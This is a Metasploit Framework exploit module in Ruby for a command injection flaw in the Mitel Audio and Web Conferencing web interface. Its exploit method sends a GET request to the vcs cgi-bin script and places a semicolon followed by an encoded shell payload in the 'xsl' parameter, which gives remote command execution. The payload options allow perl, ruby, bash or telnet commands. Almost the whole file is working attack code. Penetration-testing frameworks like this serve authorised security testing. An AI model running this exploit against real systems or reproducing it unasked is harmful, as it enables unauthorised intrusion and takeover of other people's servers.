##
# $Id: mitel_awc_exec.rb 11516 2011-01-08 01:13:26Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mitel Audio and Web Conferencing Command Injection',
			'Description'    => %q{
					This module exploits a command injection flaw within the Mitel
				Audio and Web Conferencing web interface.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11516 $',
			'References'     =>
				[

					['URL', 'http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-14'],
					['OSVDB', '69934'],
			#		['CVE',   ''],
			#		['BID',   '']
				],
			'Platform'       => ['unix', 'linux'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
					'BadChars'    => "<>",
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Dec 12 2010'
			))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('URIPATH', [ true,  "The path to the vcs cgi-bin binary", "/awcuser/cgi-bin/vcs" ])
			], self.class)
	end

	def exploit
		print_status("Attempting to execute our command..")

		res = send_request_cgi(
			{
				'uri'          => datastore['URIPATH'],
				'method'       => 'GET',
				'vars_get'     => {
					'xml' => 'withXsl',
					'xsl' => ';' + payload.encoded
				}
			}, 10)

		if res and res.code.to_i > 200
			print_error("Unexpected reply: #{res.code} #{res.body[0,500].inspect}...")
			return
		end

		handler
	end

end